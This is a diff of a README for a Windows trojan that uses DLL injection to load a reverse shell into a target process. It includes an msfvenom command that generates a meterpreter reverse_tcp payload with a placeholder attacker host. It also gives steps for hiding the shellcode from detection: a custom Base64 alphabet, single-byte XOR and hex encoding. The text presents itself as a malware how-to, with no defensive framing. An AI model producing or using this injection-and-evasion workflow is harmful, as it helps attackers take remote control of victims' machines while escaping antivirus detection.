@@ -3,8 +3,6 @@ Trojan using dll injection of a custom library that spawns a shell on a target m
 
 # 💻 Code
 
-<img align="right" src="media/a1.png" width="440" />
-
 This malware injects a malicious library into a target process or directly creates a process and uploads the library into it, the dll contains a simple encoded base64 data that spawns a reverse shell.
 
 ### 0) Listener and payload
@@ -15,11 +13,7 @@ This malware injects a malicious library into a target process or directly creat
 - The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
 ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 
 
-- Once we have the shellcode we encode the binary data into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more;
-  
-- Secondly we apply XOR encryption using a single-byte key;
-  
-- Then we convert it into its hexadecimal string representation and we get the final encrypted shellcode.
+- Once we have the shellcode we load it into the ``` encrypter.c```  file, where the binary data is converted into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more, secondly XOR encryption is applied using a single-byte key, and finally we convert it into its hexadecimal string representation.
 
 ### 1) DLL
 The malicious library contains 4 different call cases, process attach/detach, and thread create/delete, the best one is in my opinion the first one. When the library is attached to the process, it runs arbitrary code, in the sample there is a simple windows message box, in the actual dll the code decodes base64 encoded data and uploads the shellcode containing the reverse shell to memory. You can create a dll on Visual Studio by making a new project and selecting the dll template, also rememeber to build both the dll and the injector in release mode and in the same architecture.
